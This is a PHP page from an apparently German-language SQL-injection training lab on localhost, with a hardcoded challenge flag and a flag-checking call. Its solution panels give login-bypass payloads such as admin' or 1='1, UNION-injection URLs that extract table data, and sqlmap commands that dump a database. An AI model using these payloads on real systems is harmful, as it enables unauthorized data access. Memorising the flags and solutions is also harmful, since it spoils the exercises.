<!DOCTYPE html>
<html lang="en">
<title> SQL-Injection</title>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <base href="http://localhost:8026" />
    <link rel="stylesheet" href="/css/style.css">
</head>

<body>

    <form action="index.php" method="POST">

        <input type="checkbox" id="flag2" name="check" />
        <input type="checkbox" id="checkbox" name="check_round1">
        <input type="checkbox" id="s1_solution" name="s1_solution" value="1">
        <input type="checkbox" id="s2_solution" name="s2_solution" value="1">
        <input type="checkbox" id="s2_alternative" name="solution">


        <div class=" title">
            <div class="inhalt">
                <div style="margin: 3px 605px;font-size: 16px; position: absolute; "><a href="http://localhost"
                        style="text-decoration: none;"> <span style="color :#0c2461; ">Home</span></a></div>
                <div style="margin: 5px 677px;font-size: 13px; position: absolute; width:145px;"><a
                        href="http://localhost:5000/command_injection_1" style="text-decoration: none;"> <span
                            style="color :#0c2461; ">Command-Injection</span></a></div>
                <div style="margin: 5px 830px;font-size: 13px; position: absolute; width:145px;"><a
                        href="http://localhost:3000" style="text-decoration: none;"> <span
                            style="color :#0c2461; ">Path-Traversal</span></a></div>
                <div style="margin: 5px 953px;font-size: 13px; position: absolute; width:145px;"><a
                        href="http://localhost:8026" style="text-decoration: none;"> <span
                            style="color :#0c2461; ">SQL-Injection</span></a></div>
                <div style="margin: 5px 1063px;font-size: 13px; position: absolute; width:145px;"><a
                        href="http://localhost:8026/xssMain.php" style="text-decoration: none;"> <span
                            style="color :#0c2461; ">XSS-Injection</span></a></div>

                <h1 style="padding: 0px 44px;font-size: 20px;"> Web-Exploitation-Demos
                </h1>
            </div>
        </div>

        <div class="box">
            <h1> SQL-Injection</h1>
            <ul>
                <li>
                    <a href="Einleitung/einleitung1.php" style="text-decoration:none;"><span
                            style="color :#0c2461; ">Einleitung</span></a>
                </li>

                <li><button type="submit" name="stufe1"> (1) Anfreifbare Login Seite </button>
                </li>
                <li>
                    <a href="challRepariert/chall1.php" style="text-decoration: none;"><span style="color:#0c2461"> (1)
                            Challenge geschützt</span></a>
                </li>
                <li><span style="color:#0c2461"> (2) Union-Injection </span>
                    <label for="flag2" class="flag2">Union-Injection Union-Injection (2)</label>
                <li>
                    <?php


                    echo "<a style='text-decoration: none;' href =\"challRepariert/chall2.php?id=1" . "\"  ><span
                   style='color:#0c2461'> (2) Challenge geschützt</span></a>";

                    ?>
                </li>
            </ul>
        </div>

        <div class="rahmen">

            <div class="box">

                <div class="auswahl">


                    <?php

                    $flag = trim($_POST['flag_eingabe']);
                    if (isset($_POST['stufe1']) | (isset($_POST['login']))) {

                        include_once  'conn.php';

                        echo '<div class = "chall1" style="color:blue;width: 555px;margin: 15px 60px;position: absolute; font-size:16px;">Challenge 1: Demonstration einer SQL-Injection-Sicherheitslücke </div>';

                        echo "<br/> <br/>";
                        echo '<div style="color: black; text-align: left; margin: 17px 32px;font-size: 14px;float: left;position: absolute;width: 636px;"><strong> In dieser Challenge entdeckst du Möglichkeiten zum Einloggen, ohne Passwort zu kennen.</br></strong></div>';
                        echo '<div><a href="Einleitung/einleitung1.php/#Chall1" style="color:gray;margin:44px 215px; position:absolute;font-size: 13px;width: 95px;"> Mehr ansehen</a>
                        </div> ';

                        echo '<div class="round1"> Einloggen
                            <label for="checkbox" style="margin: -50px -77px;">Einloggen</label>  </div>';

                        echo '<div class="round2">  Lösungen
                            <label for="s2_solution" >Lösungen</label></div>';

                        echo '<div class="round2">  Lösungen  <label for="s2_solution" class="begin1">Lösung</label>  </div>';
                        echo "<br/><br/><br/>";

                        if (isset($_POST['stufe1']) | (isset($_POST['login']))) {
                            // SQL-Query ausgabe
                            include_once  'sql_select.php';
                            // Ausgabe fuer ein gueltige eingabe
                            if ($status == false) {
                                echo "<br/>";
                                include 'ausgabe.php';
                            }

                            if ($status == true) {
                                echo '<div id="erg" ><h3> Ungültige Eingabe! versuchen Sie nochmal</h3> </div>';
                            }
                        }
                    } else if ((isset($_POST['flag_btn'])) | (isset($_POST['back']))) {
                        // ueberpruefen von Flag in Datenbank.
                        include_once 'check_flags.php';
                        // Post request zu API server geschickt
                        if ($_POST['flag_eingabe'] == "stufe1_is_ert1203948s9") {
                            echo "";
                            $curl = curl_init();
                            curl_setopt($curl, CURLOPT_URL, "http://main-website:3000/check-flag");
                            curl_setopt($curl, CURLOPT_POST, true);
                            curl_setopt($curl, CURLOPT_POSTFIELDS, "challenge_name=sql-injection_level-1&challenge_flag=stufe1_is_ert1203948s9");
                            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
                            $output = curl_exec($curl);
                            curl_close($curl);
                        } else {
                            echo '<span style="color:red; text-align: center; margin: 35px -30px; font-size: 13px;position: absolute; ">Ungültige Eingabe</span>';
                        }
                    } else {



                        echo "<br/> <br/>";
                        echo '<div ><strong><span style =" color:blue; font-size:16px;">Challenge 2: Unberechtigter Datenzugriff </strong></div>';
                        echo "<br/>";
                        echo '<div class="round"></div>';
                        echo '<div class="round1"></div>';

                        echo "<a href =\"union_injection.php?id=1" .  "\" ><span style='color :black; text-decoration:none;margin: 180px -127px;position: absolute;'>Beginn</span></a>";
                        echo '<div class="round">  Lösungen <label for="s1_solution" class="begin1"> Lösungen</label>  </div>';

                        echo '<div style="color: black; text-align: left; margin: -8px 57px; font-size: 13px;position: absolute;  width: 575px;">In dieser Challenge entdeckst du Möglichkeiten unberichtigt auf Daten zuzugreifen. Herausforderungen sind: </br> </br><strong>1. Genaue Anzahl der Spalten herausfinden </br> </br> 2. Suche nach einer Spalte, die String enthält  </br></br>  3. Abrufen von Daten aus anderen Tabellen.</br></strong></div>';
                        echo '<div><a href="Einleitung/einleitung1.php/#Chall2" style="color:gray;margin:110px 168px; position:absolute;font-size: 13px;width: 95px;"> Mehr ansehen</a></div>';
                    }


                    ?>


                </div>
            </div>
        </div>

        <div class="flag_popup">
            <div class="flag_eingabe">
                <input type="text" id="flag_text" name="flag_eingabe" autocomplete="off"
                    placeholder="Geben sie Flagge ein:" style="width: 322px;height: 40px; margin: 1px 20px; ">
            </div>
            <div class="flag_btn">
                <input type="submit" name="flag_btn" value="submit"
                    style="  height: 40px;width: 350px; margin: 10px 30px;
                    background: #00dbff52; border-top-right-radius: 10px; border-top-left-radius: 10px;border-bottom-right-radius: 10px; border-bottom-left-radius: 10px;">
            </div>
        </div>
        <div class="solution2">
            <p style="text-align:center;color:black;">1. Gebe dem Benutzername den Wert <strong> admin' or 1='1
                </strong> ein. </p>
            <p style="text-align:center;color:black;">2. Alternative Lösungen:</p>
            <p style="text-align:center;color:black;"><strong> admin' OR 1='1;--</strong></p>
            <p style="text-align:center;color:black;"> <strong> admin' # </strong></p>
            <p style="text-align:center;color:black;"><strong> admin' or 1=1# </strong></p>
        </div>



        <div class="solution"><label for="s2_alternative" style="margin: 260px 10px;"> Alternative Lösung </label>
            <p style="font-size: 13px">1. Exacte Anzahl der Spalten: Erhöhe Spaltennummer, bis ein Fehler zeigt. Die
                Tabelle hat insgesamt 5 Spalten.</p>
            <p style="font-size: 13px"><strong> http://localhost:8026/union_injection.php?id=1 order by 5</strong> </p>
            <p style="font-size: 13px"> 2. In diesem Fall sind alle Spalten anfällig. Das kannst du folgende Query
                testen:
            <p style="font-size: 13px"><strong> http://localhost:8026/union_injection.php?id=1 union select
                    'a','a','a','a','a' </strong>
                <- a ist biliebig </p>
                    <p style="font-size: 13px">3. Hier geht es um die von nicht sichtbarer Spalte Umsatz das gesamte
                        Wert zu berechnen und herauszufinden.3 Spalten sind sichtbar. Das kannst du ausnutzen, weil die
                        alle anfällig sind. Deswegen kannst du eine von dieser Spalte Z.b Folgende Query eingeben:</p>
                    <p style="font-size: 13px"><strong>http://localhost:8026/union_injection.php?id=1 union select
                            sum(Umsatz), null,null,null,null from Filiale </strong> </p>
                    <p style="font-size: 13px"> Das Ergebnis sollte <strong> "480"</strong> zeigen.</p> <br>
                    <p style="color:blue; text-decoration:underline; margin:0px 10px;"> Alternative Lösung </p>
        </div>

        <div class="alternative_s2">
            <legend style="font-size: 13px;">
                <?php echo "Alternative kannst du diese Challenge mit Hilfe SQLMap lösen. SQLMap ist ein open source Tool zum Durchführen einer SQL-Injection. Dieses Tool ist unter Kali Linux verfügbar. Gebe folgende Befehle in Terminal ein:"; ?>
            </legend>
            <p style="font-size: 13px;">
                <strong><?php echo "->sqlmap -u http://localhost:8026/union_injection.php?id=1 --dbs"; ?></strong> (hier
                wirst du sehen, welche Datenbank existiert.)
            </p>
            <p style="font-size: 13px;"><strong>
                    <?php echo "-> sqlmap -u http://localhost:8026/union_injection.php?id=1 -D test --tables</strong> (hier wirst du sehen, welche Tabellen in Datenbank existieren)"; ?>
            </p>
            <p style="font-size: 13px;"><strong>
                    <?php echo "-> sqlmap -u http://localhost:8026/union_injection.php?id=1 -D test -T Filiale --dump"; ?></strong>
                (hier zeigt aller Inhalte der Tabelle * Filiale *) </p>
            <p style="background-image: url(sqlmap.png); height: 350px;"></p>

        </div>
        <div class="popup">

            <label for="checkbox" class="cancel"> </label>
            <div class="round"> Stufe 1
            </div>
            <div class="inhalt"></div>
            <?php
            echo "Du kannst den Nutzernamen  admin verwenden. Finde heraus wie du dich ohne Password einloggen kannst. <br /> <br />";

            ?>

            <div class="name">
                <input type="text" name="username" placeholder="username" autocomplete="off">
                <input type="password" name="password" placeholder="Password">
            </div>
            <div class="btn">
                <input type="submit" name="login" value="submit">
            </div>
    </form>

    <div class="hint">
        <ul>
            <p>Hinweise:</p>
            <li>
                <div class="content">
                    <h3>Anführungszeichen (')</h3>
                    <p> Anführungszeichen (') schließt oder öffnet die SQL-Anweisung. <br /> </p>
                </div>

            </li>
            <li>
                <div class="content">
                    <h3> Boolescher Bedingungen Schlüsselwort OR </h3>
                    <p> 1=1 ist eine Anweisung, die immer den Wert true liefert. <br /> </p>
                </div>

            </li>
            <li>
                <div class="content">
                    <h3> # charactor</h3>
                    <p> Das Doppelkreuz (#) kommentieren den Rest der SQL-Anfrage aus.</p>
                </div>
            </li>
            <li>
                <div class="content">
                    <h3> Das Semikolon (;)</h3>
                    <p> Das Semikolon (;) beendet die SQL-Anweisung </p>
                </div>

            </li>

        </ul>
    </div>
    </div>
    </div>

    </form>

</body>

</html>